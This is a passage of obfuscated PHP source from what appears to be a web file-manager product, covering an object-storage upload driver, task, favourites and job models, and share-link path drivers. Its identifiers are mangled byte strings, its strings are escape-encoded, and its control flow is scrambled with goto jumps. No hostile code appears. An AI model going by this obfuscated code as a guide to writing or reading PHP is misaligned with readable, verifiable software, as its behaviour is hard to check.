$Dù‹›ÜÁÚ ? $d‚İ¹õŸ–¤[202] : $d‚İ¹õŸ–¤[203]; $BÑÏÓ¿çŒ¶ = array($d‚İ¹õŸ–¤[204] => $Dù‹›ÜÁÚ . $d‚İ¹õŸ–¤[205] . rawurlencode($EÅ¸Øå™Š), $d‚İ¹õŸ–¤[206] => $f—Î»ˆÖ“¬); goto B¹È¿é¾¢; d†ß±¬Æë: } public function fileOutServer($aæƒªºÌÂí, $aâÛ¯ñÑÂš = false, $CÊí‘çŒÄ± = false, $fŠÉº³±‹ = '') { parent::fileOut($aæƒªºÌÂí, $aâÛ¯ñÑÂš, $CÊí‘çŒÄ±, $fŠÉº³±‹); } public function fileOutImage($bÑ³¼Íì, $FäÎ¦×»­Æ = 250) { $A÷Âğ—Š†™ = $this->link($bÑ³¼Íì); $this->fileOutLink($A÷Âğ—Š†™); } public function fileOutImageServer($Eé¶ˆâÖÒ…, $Aã¤´Ûœï  = 250) { parent::fileOutImage($Eé¶ˆâÖÒ…, $Aã¤´Ûœï ); } public function hashMd5($A¶å†´á˜¾, $b…¡µ¡–Ÿ = '') { $C¶×æ¶Ï¯ =& $_SERVER[”Ì÷ñ­î¸]; $Fâ³İ‰¯ŸÍ = $this->objectMeta($A¶å†´á˜¾); if (!$Fâ³İ‰¯ŸÍ) { return !1; } $b…¡µ¡–Ÿ = $b…¡µ¡–Ÿ ? $b…¡µ¡–Ÿ : _get($Fâ³İ‰¯ŸÍ, $C¶×æ¶Ï¯[207]); $b…¡µ¡–Ÿ = $b…¡µ¡–Ÿ ? $b…¡µ¡–Ÿ : _get($Fâ³İ‰¯ŸÍ, $C¶×æ¶Ï¯[197], $C¶×æ¶Ï¯[33]); return $b…¡µ¡–Ÿ; } public function uploadFormData($f®²¶ª²ŞÌ, $FùàÌ‰‚ = 3600) { $E„ª¡õÃ§Ì =& $_SERVER[”Ì÷ñ­î¸]; $DĞ‰´¾°ÎÔ = $this->pathFather($f®²¶ª²ŞÌ); $Cèß­Ø‰Í = $this->client->getHttpUploadPostParams($this->bucket, $DĞ‰´¾°ÎÔ, $E„ª¡õÃ§Ì[185], $FùàÌ‰‚); return array_merge((array) $Cèß­Ø‰Í, array($E„ª¡õÃ§Ì[169] => $this->getHost())); } public function multiUploadFormData($A­¸Š§Èä‹, $aƒë–Ú‹îÜ = 3600) { $aÊŠÛ³øÆÇ =& $_SERVER[”Ì÷ñ­î¸]; $b„Ê©èõ™Ğ = gmdate($aÊŠÛ³øÆÇ[208]); $A—˜´¡ÙõÖ = array(); $f©‹Æ”†ëÚ = $this->client->getUploadId($this->bucket, $A­¸Š§Èä‹, $A—˜´¡ÙõÖ); if (!$f©‹Æ”†ëÚ) { return !1; } return array($aÊŠÛ³øÆÇ[209] => $f©‹Æ”†ëÚ, $aÊŠÛ³øÆÇ[169] => $this->getHost() . $aÊŠÛ³øÆÇ[8] . $this->pathEncode($A­¸Š§Èä‹), $aÊŠÛ³øÆÇ[210] => $b„Ê©èõ™Ğ, $aÊŠÛ³øÆÇ[89] => $A­¸Š§Èä‹); } public function multiUploadAuthData($BÍäù¢÷Â, $aŞ©ËîÎº« = array()) { goto f®Í•‚¾·­; E†ší«ÕÖé: $CŸ¾¨Ÿê = array($Dåİª¥†Æ‹[212], $Dåİª¥†Æ‹[33], $Dåİª¥†Æ‹[116], $Dåİª¥†Æ‹[33], "\x78\55\141\x6d\172\55\144\141\164\x65\x3a{$D¹ÔŠ³éÀ‡}", $Dåİª¥†Æ‹[8] . $this->bucket . $Dåİª¥†Æ‹[8] . $this->pathEncode($C¯Ü‡ö‡¶ˆ) . $f„åïÕô—); if (strpos($f„åïÕô—, $Dåİª¥†Æ‹[213]) === 0) { $CŸ¾¨Ÿê[0] = $Dåİª¥†Æ‹[214]; } if (isset($aŞ©ËîÎº«[$Dåİª¥†Æ‹[215]]) && $aŞ©ËîÎº«[$Dåİª¥†Æ‹[215]] == $Dåİª¥†Æ‹[216]) { $CŸ¾¨Ÿê[0] = $Dåİª¥†Æ‹[216]; } goto c²“‰…“ó„; FÌ¸¬ËÌµ: $C¯Ü‡ö‡¶ˆ = $aŞ©ËîÎº«[$Dåİª¥†Æ‹[89]]; unset($aŞ©ËîÎº«[$Dåİª¥†Æ‹[89]]); if (isset($aŞ©ËîÎº«[$Dåİª¥†Æ‹[211]])) { $aŞ©ËîÎº«[$Dåİª¥†Æ‹[210]] = $D¹ÔŠ³éÀ‡; return $this->listUploadParts($C¯Ü‡ö‡¶ˆ, $aŞ©ËîÎº«); } goto E†ší«ÕÖé; E‡¾‚÷É¬: if (strpos($f„åïÕô—, $Dåİª¥†Æ‹[213]) === 0) { return array($Dåİª¥†Æ‹[220] => $dƒ‹êİ¿÷À, $Dåİª¥†Æ‹[210] => $D¹ÔŠ³éÀ‡); } return $dƒ‹êİ¿÷À; goto E§¼‹¸İ˜·; c²“‰…“ó„: $cÈËÒøËù¾ = implode($Dåİª¥†Æ‹[217], $CŸ¾¨Ÿê); $dÅ¤²¸î¾‘ = base64_encode(hash_hmac($Dåİª¥†Æ‹[218], $cÈËÒøËù¾, $this->secret, !0)); $dƒ‹êİ¿÷À = $Dåİª¥†Æ‹[219] . $this->accessKey . $Dåİª¥†Æ‹[4] . $dÅ¤²¸î¾‘; goto E‡¾‚÷É¬; f®Í•‚¾·­: $Dåİª¥†Æ‹ =& $_SERVER[”Ì÷ñ­î¸]; $D¹ÔŠ³éÀ‡ = isset($aŞ©ËîÎº«[$Dåİª¥†Æ‹[210]]) ? $aŞ©ËîÎº«[$Dåİª¥†Æ‹[210]] : gmdate($Dåİª¥†Æ‹[208]); $f„åïÕô— = isset($aŞ©ËîÎº«[$Dåİª¥†Æ‹[160]]) ? $aŞ©ËîÎº«[$Dåİª¥†Æ‹[160]] : $Dåİª¥†Æ‹[33]; goto FÌ¸¬ËÌµ; E§¼‹¸İ˜·: } public function listUploadParts($a„Ü›õ†ëè, $e˜Ÿçƒæµ = array()) { goto fĞåòˆé¶; F¬À ˆ”–¿: $fËŒÜéß÷ğ = $this->multiUploadAuthData($a„Ü›õ†ëè, $e˜Ÿçƒæµ); if (empty($fËŒÜéß÷ğ)) { return !1; } return array($BŒ±´ÂÒ¶[220] => $fËŒÜéß÷ğ, $BŒ±´ÂÒ¶[210] => $e˜Ÿçƒæµ[$BŒ±´ÂÒ¶[210]], $BŒ±´ÂÒ¶[222] => $f¯Ø®õ†Á); goto E¬ìŸñ¾½¤; dËêĞƒ„ğØ: if (!$f¯Ø®õ†Á) { return !1; } unset($e˜Ÿçƒæµ[$BŒ±´ÂÒ¶[211]], $e˜Ÿçƒæµ[$BŒ±´ÂÒ¶[215]]); $e˜Ÿçƒæµ[$BŒ±´ÂÒ¶[89]] = $a„Ü›õ†ëè; goto F¬À ˆ”–¿; fĞåòˆé¶: $BŒ±´ÂÒ¶ =& $_SERVER[”Ì÷ñ­î¸]; $dÍçö¥Ñ±Î = str_replace($BŒ±´ÂÒ¶[221], $BŒ±´ÂÒ¶[33], $e˜Ÿçƒæµ[$BŒ±´ÂÒ¶[160]]); $f¯Ø®õ†Á = $this->client->listParts($this->bucket, $a„Ü›õ†ëè, $dÍçö¥Ñ±Î); goto dËêĞƒ„ğØ; E¬ìŸñ¾½¤: } public function getHost() { return parent::getHost() . $_SERVER[”Ì÷ñ­î¸][8] . $this->bucket; } public function size($c¼´ÎÕİÊÌ) { $C•Ó¥¬ÔŠí = $this->objectMeta($c¼´ÎÕİÊÌ); return $C•Ó¥¬ÔŠí ? $C•Ó¥¬ÔŠí[$_SERVER[”Ì÷ñ­î¸][77]] : 0; } public function info($FÄµó‹Úé) { if ($this->isFolder($FÄµó‹Úé)) { return $this->folderInfo($FÄµó‹Úé); } else { if ($this->isFile($FÄµó‹Úé)) { return $this->fileInfo($FÄµó‹Úé); } } return !1; } public function exist($c¡É¿“ù) { return $this->isFile($c¡É¿“ù) || $this->isFolder($c¡É¿“ù); } public function isFile($f…£²‹Ğš÷) { return !$this->isFolder($f…£²‹Ğš÷) && $this->objectMeta($f…£²‹Ğš÷); } public function isFolder($FİéÍŸ’°Ö) { return $this->cacheMethod($_SERVER[”Ì÷ñ­î¸][223], $FİéÍŸ’°Ö); } protected function objectMeta($eòºšÂ§À) { return $this->cacheMethod($_SERVER[”Ì÷ñ­î¸][224], $eòºšÂ§À); } protected function _objectMeta($aÅ…ÇÉƒå) { $EÙÓŒ‹™ =& $_SERVER[”Ì÷ñ­î¸]; $aÅ…ÇÉƒå = rtrim($aÅ…ÇÉƒå, $EÙÓŒ‹™[8]); try { $c½ŞŒİÑĞ± = $this->client->getObjectInfo($this->bucket, $aÅ…ÇÉƒå); if (!isset($c½ŞŒİÑĞ±[$EÙÓŒ‹™[207]]) && isset($c½ŞŒİÑĞ±[$EÙÓŒ‹™[225]])) { $c½ŞŒİÑĞ±[$EÙÓŒ‹™[207]] = $c½ŞŒİÑĞ±[$EÙÓŒ‹™[225]]; } } catch (OSS\Core\OssException $D‚µÈŸê‡ï) { $c½ŞŒİÑĞ± = !1; } if (!$c½ŞŒİÑĞ±) { } return $c½ŞŒİÑĞ±; } protected function _isFolder($c”™×Ó¡ÌŠ) { goto DÔâ®´Û™±; CÁ™Œ ƒùÄ: if (substr($Dˆ´°äš’[0][$A‘÷ë¿¥âÛ[28]], -1) == $A‘÷ë¿¥âÛ[8]) { return !0; } if (get_path_this($Dˆ´°äš’[0][$A‘÷ë¿¥âÛ[28]]) == get_path_this($c”™×Ó¡ÌŠ)) { return !1; } return !0; goto C…ï­•¶¦İ; DÔâ®´Û™±: $A‘÷ë¿¥âÛ =& $_SERVER[”Ì÷ñ­î¸]; $c”™×Ó¡ÌŠ = rtrim($c”™×Ó¡ÌŠ, $A‘÷ë¿¥âÛ[8]); if ($c”™×Ó¡ÌŠ == $A‘÷ë¿¥âÛ[33] || $c”™×Ó¡ÌŠ == $A‘÷ë¿¥âÛ[8]) { return !0; } goto f‰ñ¡¡·™; f‰ñ¡¡·™: $Dˆ´°äš’ = $this->client->getBucket($this->bucket, $c”™×Ó¡ÌŠ, null, 1); if (empty($Dˆ´°äš’)) { return !1; } $Dˆ´°äš’ = array_values($Dˆ´°äš’); goto CÁ™Œ ƒùÄ; C…ï­•¶¦İ: } } define($_SERVER[”Ì÷ñ­î¸][226], 1); goto DÅŒÈÀíéÌ; Bä¡Ù÷‡¹: class SystemTaskModel extends ModelBaseLight { public $optionType = "\123\171\163\164\x65\155\x2e\x74\x61\163\x6b\114\151\x73\164"; public $field = array("\156\141\155\145", "\x74\x79\x70\145", "\x65\x76\145\x6e\164", "\164\151\155\145", "\x64\145\163\x63", "\x73\171\163\164\145\x6d", "\145\156\x61\x62\154\145", "\x6c\141\x73\x74\122\165\x6e", "\163\x6f\162\x74"); public function listData($Eæ­âŒ¸òÂ = false, $eçİ°¼ºÃ§ = "\163\157\162\x74", $cÊíÒ©³­Á = false) { return parent::listData($Eæ­âŒ¸òÂ, $eçİ°¼ºÃ§, $cÊíÒ©³­Á); } public function add($e÷ÀµÄ–ò) { $Dƒ§¹¡Êó =& $_SERVER[”Ì÷ñ­î¸]; $b¨ôŠçáÌ˜ = $this->findByName($e÷ÀµÄ–ò[$Dƒ§¹¡Êó[28]]); if ($b¨ôŠçáÌ˜) { return !1; } $e÷ÀµÄ–ò[$Dƒ§¹¡Êó[1404]] = 0; $e÷ÀµÄ–ò[$Dƒ§¹¡Êó[2127]] = $this->getSort(); return parent::insert($e÷ÀµÄ–ò); } private function getSort() { $F˜ø‰Å·‰ =& $_SERVER[”Ì÷ñ­î¸]; $c…ÊåÄøõ‡ = parent::listData(); $D™³Èöæ¡ò = array_to_keyvalue($c…ÊåÄøõ‡, $F˜ø‰Å·‰[33], $F˜ø‰Å·‰[2127]); return empty($D™³Èöæ¡ò) ? 0 : max($D™³Èöæ¡ò) + 1; } public function update($bæêñæÂ©ƒ, $dÇ›×îÑõ‘) { $e°ŠŸôÖÀÇ =& $_SERVER[”Ì÷ñ­î¸]; $Fõ´‹ÑØÙò = $this->listData($bæêñæÂ©ƒ); $F¨›ÇÙ†´™ = $this->findByName($dÇ›×îÑõ‘[$e°ŠŸôÖÀÇ[28]]); if (!$Fõ´‹ÑØÙò || $F¨›ÇÙ†´™ && $F¨›ÇÙ†´™[$e°ŠŸôÖÀÇ[367]] != $Fõ´‹ÑØÙò[$e°ŠŸôÖÀÇ[367]]) { return !1; } return parent::update($bæêñæÂ©ƒ, $dÇ›×îÑõ‘); } public function remove($F¯¦ĞÈ¹Ëà, $c°Ãâ­¥”Ê = false) { $fñ³—î³¸ =& $_SERVER[”Ì÷ñ­î¸]; $A‚Òäîšº = $this->listData($F¯¦ĞÈ¹Ëà); if (!$A‚Òäîšº) { return; } if (!$c°Ãâ­¥”Ê && $A‚Òäîšº[$fñ³—î³¸[1080]] == $fñ³—î³¸[83]) { return !1; } return parent::remove($F¯¦ĞÈ¹Ëà); } public function enable($f²›ññ¶‹ , $aÈ¨Ë‚°æ) { return $this->update($f²›ññ¶‹ , array($_SERVER[”Ì÷ñ­î¸][2478] => $aÈ¨Ë‚°æ)); } public function run($eŒò‹¨ªø) { return $this->update($eŒò‹¨ªø, array($_SERVER[”Ì÷ñ­î¸][2489] => time())); } } class UserFavModel extends ModelBase { protected $tableName = "\165\163\145\x72\137\x66\x61\166"; protected function cacheFunctionAlias($e ñÄ°êÛì) { $f£åÎŠ´£ =& $_SERVER[”Ì÷ñ­î¸]; return array($f£åÎŠ´£[2490] => array(USER_ID, $f£åÎŠ´£[2491])); } protected function listData() { $A¹â­¥ÉÌÃ =& $_SERVER[”Ì÷ñ­î¸]; $c…ŒÌ‹¬Ä… = array($A¹â­¥ÉÌÃ[1430] => USER_ID, $A¹â­¥ÉÌÃ[436] => 0); $DŒ„ãÆå­ = $A¹â­¥ÉÌÃ[2492]; $aÀ¥Ï¦‡”ğ = $this->field($DŒ„ãÆå­)->where($c…ŒÌ‹¬Ä…)->order($A¹â­¥ÉÌÃ[2493])->select(); return $aÀ¥Ï¦‡”ğ ? $aÀ¥Ï¦‡”ğ : array(); } protected function resetCache() { } protected function listView() { goto bŒï›çâ; bŒï›çâ: $bì©Ó ÍÒ‹ =& $_SERVER[”Ì÷ñ­î¸]; $EŒ”ÌôŒ— = $this->listData(); $Fù¼Ö¡éÀ = array_filter_by_field($EŒ”ÌôŒ—, $bì©Ó ÍÒ‹[29], $bì©Ó ÍÒ‹[382]); goto C›˜…È¾İ; e¾ÈÅ°Íìç: $FÉ ’»…¸² = array_to_keyvalue($FÉ ’»…¸², $bì©Ó ÍÒ‹[369]); foreach ($EŒ”ÌôŒ— as $bÂ–Âå‰¼Û => $BöÓïĞ¶Œ²) { $B¥âùïµÃ¿ = $FÉ ’»…¸²[$BöÓïĞ¶Œ²[$bì©Ó ÍÒ‹[75]]]; $B¥âùïµÃ¿ = $B¥âùïµÃ¿ ? $B¥âùïµÃ¿ : array(); $EŒ”ÌôŒ—[$bÂ–Âå‰¼Û] = array_merge($B¥âùïµÃ¿, $BöÓïĞ¶Œ²); } return $EŒ”ÌôŒ—; goto C»Øê¨÷Ñ¿; A…µŸ›øË·: $FÛå±µÖÒ = array($bì©Ó ÍÒ‹[383] => array($bì©Ó ÍÒ‹[384], $EêÀ¾ŞÊğ²)); $FÉ ’»…¸² = Model($bì©Ó ÍÒ‹[754])->listSource($FÛå±µÖÒ, $EçÜ¹¤Œ¦ñ); $FÉ ’»…¸² = array_merge($FÉ ’»…¸²[$bì©Ó ÍÒ‹[73]], $FÉ ’»…¸²[$bì©Ó ÍÒ‹[74]]); goto e¾ÈÅ°Íìç; C›˜…È¾İ: $EêÀ¾ŞÊğ² = array_to_keyvalue($Fù¼Ö¡éÀ, $bì©Ó ÍÒ‹[33], $bì©Ó ÍÒ‹[75]); if (!$EêÀ¾ŞÊğ²) { return $EŒ”ÌôŒ—; } $EçÜ¹¤Œ¦ñ = 2000; goto A…µŸ›øË·; C»Øê¨÷Ñ¿: } protected function addFav($C†¹ğæª½, $AÔÅíô›¢ù = '', $Cò¬ºä±‚­ = "\x73\x6f\x75\x72\x63\x65") { goto D±İÓ³²¢ì; aæ”ë½–Ò: $B°¬Ö¢İŒ² = array($C‡¼Ãù…Í•[1430] => USER_ID, $C‡¼Ãù…Í•[436] => 0); $e¥š†ÑÄø = $this->where($B°¬Ö¢İŒ²)->max($C‡¼Ãù…Í•[2127]); if (!$e¥š†ÑÄø) { $e¥š†ÑÄø = 0; } goto BÛâ¬¯; D±İÓ³²¢ì: $C‡¼Ãù…Í• =& $_SERVER[”Ì÷ñ­î¸]; $B°¬Ö¢İŒ² = array($C‡¼Ãù…Í•[1430] => USER_ID, $C‡¼Ãù…Í•[436] => 0, $C‡¼Ãù…Í•[388] => $Cò¬ºä±‚­, $C‡¼Ãù…Í•[387] => $C†¹ğæª½); if ($this->where($B°¬Ö¢İŒ²)->find()) { return !1; } goto aæ”ë½–Ò; c¿àœ¬©Ğ: return $this->add($eôŠ¶²—Å¼); goto Cˆá£¾ƒŞŸ; BÛâ¬¯: if (!$AÔÅíô›¢ù && $Cò¬ºä±‚­ == $C‡¼Ãù…Í•[382]) { $cˆ¿í›µ‡´ = Model($C‡¼Ãù…Í•[1117])->where(array($C‡¼Ãù…Í•[383] => $C†¹ğæª½))->find(); if (!$cˆ¿í›µ‡´) { return !1; } $AÔÅíô›¢ù = $cˆ¿í›µ‡´[$C‡¼Ãù…Í•[28]]; } $AÔÅíô›¢ù = $this->getAutoName($AÔÅíô›¢ù); $eôŠ¶²—Å¼ = array($C‡¼Ãù…Í•[1430] => USER_ID, $C‡¼Ãù…Í•[436] => 0, $C‡¼Ãù…Í•[386] => $AÔÅíô›¢ù, $C‡¼Ãù…Í•[387] => $C†¹ğæª½, $C‡¼Ãù…Í•[388] => $Cò¬ºä±‚­, $C‡¼Ãù…Í•[2110] => $e¥š†ÑÄø + 1); goto c¿àœ¬©Ğ; Cˆá£¾ƒŞŸ: } protected function remove($bôÕî÷¢©’) { $cŒÚ¾òƒ² =& $_SERVER[”Ì÷ñ­î¸]; $CòÂ»š „› = array($cŒÚ¾òƒ²[1430] => USER_ID, $cŒÚ¾òƒ²[385] => $bôÕî÷¢©’); return $this->where($CòÂ»š „›)->delete(); } protected function removeByName($Bå…”áÛ) { $dßÅ›õ…Ÿä =& $_SERVER[”Ì÷ñ­î¸]; $bõã¥È = array($dßÅ›õ…Ÿä[1430] => USER_ID, $dßÅ›õ…Ÿä[386] => $Bå…”áÛ, $dßÅ›õ…Ÿä[436] => 0); return $this->where($bõã¥È)->delete(); } protected function rename($f¡±·ÄîÕ, $A„—ç™Š±·) { $AÌ¬¶â¸ª =& $_SERVER[”Ì÷ñ­î¸]; if ($f¡±·ÄîÕ == $A„—ç™Š±·) { return !1; } $a±ÊóÒöÉ¡ = $this->getAutoName($A„—ç™Š±·); if ($A„—ç™Š±· != $a±ÊóÒöÉ¡) { return !1; } $AõÀÑôà‰• = array($AÌ¬¶â¸ª[1430] => USER_ID, $AÌ¬¶â¸ª[436] => 0, $AÌ¬¶â¸ª[28] => $f¡±·ÄîÕ); return $this->where($AõÀÑôà‰•)->save(array($AÌ¬¶â¸ª[28] => $A„—ç™Š±·)); } protected function resetSort($BŸ·ç’³¸) { $bæåÂ÷šãÈ =& $_SERVER[”Ì÷ñ­î¸]; $BŸ·ç’³¸ = is_array($BŸ·ç’³¸) ? $BŸ·ç’³¸ : array(); $D÷Î©‚„è¤ = array($bæåÂ÷šãÈ[1430] => USER_ID); for ($E®¤¯¼²Û = 0; $E®¤¯¼²Û < count($BŸ·ç’³¸); $E®¤¯¼²Û++) { $D÷Î©‚„è¤[$bæåÂ÷šãÈ[385]] = $BŸ·ç’³¸[$E®¤¯¼²Û]; $this->where($D÷Î©‚„è¤)->save(array($bæåÂ÷šãÈ[2110] => $E®¤¯¼²Û + 1)); } return !0; } protected function moveTop($EÎó±´·ÀÄ) { goto cå½é”‹¸º; fµÖâÎÓ²è: if (!$b¾„Ëåİø) { return; } $A¹ì¾×…ÇÍ = $this->field($cŸ‰ÇÓ÷Å´[367])->where($dê´ ä—Õ¹)->order($cŸ‰ÇÓ÷Å´[2493])->select(); $A¹ì¾×…ÇÍ = array_to_keyvalue($A¹ì¾×…ÇÍ, $cŸ‰ÇÓ÷Å´[33], $cŸ‰ÇÓ÷Å´[367]); goto a Ÿ½§£ô‡; a Ÿ½§£ô‡: $E¡ØÛÒ¸…º = $A¹ì¾×…ÇÍ; $A¹ì¾×…ÇÍ = array_remove_value($A¹ì¾×…ÇÍ, $b¾„Ëåİø[$cŸ‰ÇÓ÷Å´[367]]); array_unshift($A¹ì¾×…ÇÍ, $b¾„Ëåİø[$cŸ‰ÇÓ÷Å´[367]]); goto B¦Ùä“õòâ; cå½é”‹¸º: $cŸ‰ÇÓ÷Å´ =& $_SERVER[”Ì÷ñ­î¸]; $dê´ ä—Õ¹ = array($cŸ‰ÇÓ÷Å´[1430] => USER_ID, $cŸ‰ÇÓ÷Å´[436] => 0); $b¾„Ëåİø = $this->where($dê´ ä—Õ¹)->where(array($cŸ‰ÇÓ÷Å´[28] => $EÎó±´·ÀÄ))->find(); goto fµÖâÎÓ²è; B¦Ùä“õòâ: return $this->resetSort($A¹ì¾×…ÇÍ); goto bÉØ®¹ÙÁ; bÉØ®¹ÙÁ: } protected function moveBottom($b—íóôÒÁ) { $bšßçÄõ´— =& $_SERVER[”Ì÷ñ­î¸]; $A‘óëËôğ¸ = array($bšßçÄõ´—[1430] => USER_ID, $bšßçÄõ´—[436] => 0); $aœƒ«Œ¶šº = $this->where($A‘óëËôğ¸)->max($bšßçÄõ´—[2127]); $EŸé…ŸÆ¿ = array($bšßçÄõ´—[2127] => $aœƒ«Œ¶šº + 1); return $this->where($A‘óëËôğ¸)->where(array($bšßçÄõ´—[28] => $b—íóôÒÁ))->save($EŸé…ŸÆ¿); } private function getAutoName($d„Ûµì”­) { goto CË¼†ÛôğĞ; BêÓ³•³¥²: $E¢¡·Ãê… = array_to_keyvalue($E¢¡·Ãê…, $aë‘´à“ù[33], $aë‘´à“ù[28]); if (!$E¢¡·Ãê… || !in_array($d„Ûµì”­, $E¢¡·Ãê…)) { return $d„Ûµì”­; } for ($CÜ§Å«š•Œ = 0; $CÜ§Å«š•Œ < count($E¢¡·Ãê…); $CÜ§Å«š•Œ++) { if (!in_array($d„Ûµì”­ . "\50{$CÜ§Å«š•Œ}\x29", $E¢¡·Ãê…)) { return $d„Ûµì”­ . "\50{$CÜ§Å«š•Œ}\51"; } } goto E¯¬œ™Ü…; E¯¬œ™Ü…: return $d„Ûµì”­ . "\x28{$CÜ§Å«š•Œ}\51"; goto B›®ƒÏ®©; CË¼†ÛôğĞ: $aë‘´à“ù =& $_SERVER[”Ì÷ñ­î¸]; $F„×½Ö®¶İ = array($aë‘´à“ù[1430] => USER_ID, $aë‘´à“ù[436] => 0); $E¢¡·Ãê… = $this->field($aë‘´à“ù[28])->where($F„×½Ö®¶İ)->select(); goto BêÓ³•³¥²; B›®ƒÏ®©: } } class UserJobModel extends ModelBaseLight { public $optionType = "\x53\171\x73\x74\145\x6d\x2e\152\x6f\142\x4c\x69\x73\x74"; public $field = array("\156\x61\155\145", "\144\x65\x73\143", "\x73\157\x72\164"); const JOB_KEY = "\163\145\x6c\x66\112\157\142\x4c\151\163\x74"; public function listData($bŸô¬Õ´ç‘ = false, $DÀ‘®Äëïß = "\163\x6f\162\164", $aßÅ±Ô¾Âğ = false) { return parent::listData($bŸô¬Õ´ç‘, $DÀ‘®Äëïß, $aßÅ±Ô¾Âğ); } public function remove($d÷µ³‘Ë ‡) { return parent::remove($d÷µ³‘Ë ‡); } public function add($eİèÑÆš) { $F”Í‚¯öµ =& $_SERVER[”Ì÷ñ­î¸]; if ($this->findByName($eİèÑÆš[$F”Í‚¯öµ[28]])) { return !1; } $eİèÑÆš[$F”Í‚¯öµ[2127]] = $this->getSort(); return parent::insert($eİèÑÆš); } private function getSort() { $f¯ì»Œ–’Ğ =& $_SERVER[”Ì÷ñ­î¸]; $Dè„ôÖÆ¹• = parent::listData(); $bÀä¾•†ñê = array_to_keyvalue($Dè„ôÖÆ¹•, $f¯ì»Œ–’Ğ[33], $f¯ì»Œ–’Ğ[2127]); return empty($bÀä¾•†ñê) ? 0 : max($bÀä¾•†ñê) + 1; } public function update($a›Ô¾”éŒ¥, $AÛ•¤ëâÉö) { $fÌğ¡£éŸ™ =& $_SERVER[”Ì÷ñ­î¸]; $Cõ×ßÛ‚£ = parent::listData($a›Ô¾”éŒ¥); $b„¥®ãï°§ = $this->findByName($AÛ•¤ëâÉö[$fÌğ¡£éŸ™[28]]); if (!$Cõ×ßÛ‚£ || $b„¥®ãï°§ && $b„¥®ãï°§[$fÌğ¡£éŸ™[367]] != $Cõ×ßÛ‚£[$fÌğ¡£éŸ™[367]]) { return !1; } return parent::update($a›Ô¾”éŒ¥, $AÛ•¤ëâÉö); } public function setUserJob($BÉ‘À±Èš¶, $BÀÎŞº¦¾Ü) { goto FÜÛòçì†Ä; D…ø„ÏµŸ: $cç£óŒ²  = rtrim($cç£óŒ² , $fÉß‹ˆ—¿«[47]); Model($fÉß‹ˆ—¿«[477])->metaSet($BÉ‘À±Èš¶, self::JOB_KEY, $cç£óŒ² ); goto fùÕö•Æ„¾; B¿µàœŸ¿: $AÁÑ½ÍÂßÆ = array_to_keyvalue($DÖšÒùä£™, $fÉß‹ˆ—¿«[28]); $cç£óŒ²  = $fÉß‹ˆ—¿«[361]; foreach ($BÀÎŞº¦¾Ü as $bÖ¼ø¶”Ç) { if ($AÁÑ½ÍÂßÆ[$bÖ¼ø¶”Ç]) { $cç£óŒ²  .= $AÁÑ½ÍÂßÆ[$bÖ¼ø¶”Ç][$fÉß‹ˆ—¿«[367]] . $fÉß‹ˆ—¿«[47]; } else { $CÓƒáÎá† = $this->add($bÖ¼ø¶”Ç); $cç£óŒ²  .= $CÓƒáÎá† . $fÉß‹ˆ—¿«[47]; } } goto D…ø„ÏµŸ; FÜÛòçì†Ä: $fÉß‹ˆ—¿« =& $_SERVER[”Ì÷ñ­î¸]; if (!is_array($BÀÎŞº¦¾Ü)) { $BÀÎŞº¦¾Ü = array($BÀÎŞº¦¾Ü); } $DÖšÒùä£™ = parent::listData(); goto B¿µàœŸ¿; fùÕö•Æ„¾: } public function getUserJob($AÒéè‡œ¡) { $b‘òÛèÖ©Ë = Model($_SERVER[”Ì÷ñ­î¸][477])->metaGet($AÒéè‡œ¡); return $this->getUserJobInfo($b‘òÛèÖ©Ë[self::JOB_KEY]); } public function getUserJobInfo($C­¸£¹ÒŠß) { goto E‡Õ­Ü¿Ó; Aéßñ´‘˜: $dµÔôªë‘ = array_remove_key($dµÔôªë‘, $fƒÕ‰È¦Ëš[187]); $Cá¡ÊçÀ®… = array(); foreach ($Aª¡Å¥Ç as $F¥£ø»ë¡’) { if (isset($dµÔôªë‘[$F¥£ø»ë¡’])) { $Cá¡ÊçÀ®…[] = $dµÔôªë‘[$F¥£ø»ë¡’]; } } goto C°§Àø¼Àâ; E‡Õ­Ü¿Ó: $fƒÕ‰È¦Ëš =& $_SERVER[”Ì÷ñ­î¸]; $Aª¡Å¥Ç = explode($fƒÕ‰È¦Ëš[47], $C­¸£¹ÒŠß); $dµÔôªë‘ = parent::listData(); goto Aéßñ´‘˜; C°§Àø¼Àâ: return $Cá¡ÊçÀ®…; goto cŸ…®°º‚; cŸ…®°º‚: } } goto EæÙÕ’Û´ö; a±Ò××„ˆ: class PathDriverDbShareLink extends PathDriverDB { public function __construct($F‹ŞĞ©Ã) { $this->pathParse = $F‹ŞĞ©Ã; $this->model = Model($_SERVER[”Ì÷ñ­î¸][1117]); } protected function infoParse($dõÛÛáÖŸŸ, $Eˆ’‡ø‰Ã¢ = false, $Dò»î£Ÿùò = false) { $F»’„Ô”ñ =& $_SERVER[”Ì÷ñ­î¸]; return Action($F»’„Ô”ñ[1017])->sharePathInfo($this->pathParse[$F»’„Ô”ñ[75]], !0); } public function listPath($e»ñ¾ÌšŞŠ, $a’Ìõò÷„Ã = false) { $bÍŠÎÂ®‹ =& $_SERVER[”Ì÷ñ­î¸]; $bß¯ÃîÍÚ = parent::listPath($e»ñ¾ÌšŞŠ, $a’Ìõò÷„Ã); foreach ($bß¯ÃîÍÚ as $aÚÊ»¸°Î· => $dÍá©Ç‚Â) { if (!in_array($aÚÊ»¸°Î·, array($bÍŠÎÂ®‹[73], $bÍŠÎÂ®‹[74]))) { continue; } foreach ($dÍá©Ç‚Â as $B¸«ÂÌÜ¶á => $eÄ—È¹§ë) { $bß¯ÃîÍÚ[$aÚÊ»¸°Î·][$B¸«ÂÌÜ¶á] = Action($bÍŠÎÂ®‹[1017])->shareItemInfo($eÄ—È¹§ë); } } return $bß¯ÃîÍÚ; } public function listAll($aÂ†¸ñ˜ÃÇ) { $D²ÕŠÊÜ…÷ =& $_SERVER[”Ì÷ñ­î¸]; $BÅÀ¬¨õÈÁ = IO::info($this->pathParse[$D²ÕŠÊÜ…÷[75]]); if (!$BÅÀ¬¨õÈÁ) { return array(); } $fíàè˜‡„ = $this->model->listAll($aÂ†¸ñ˜ÃÇ); foreach ($fíàè˜‡„ as &$Cº÷‡ƒ…¯) { $Cº÷‡ƒ…¯[$D²ÕŠÊÜ…÷[391]] = Action($D²ÕŠÊÜ…÷[1017])->shareItemInfo($Cº÷‡ƒ…¯[$D²ÕŠÊÜ…÷[391]]); } return $fíàè˜‡„; } } class PathDriverDriverShareItem { public function __construct($c²Àà³‚†î) { $this->pathParse = $c²Àà³‚†î; } public function __call($B¦î•ó¿Ôà, $FäœÎÓØ„ì) { $c•¾¢½„ =& $_SERVER[”Ì÷ñ­î¸]; if 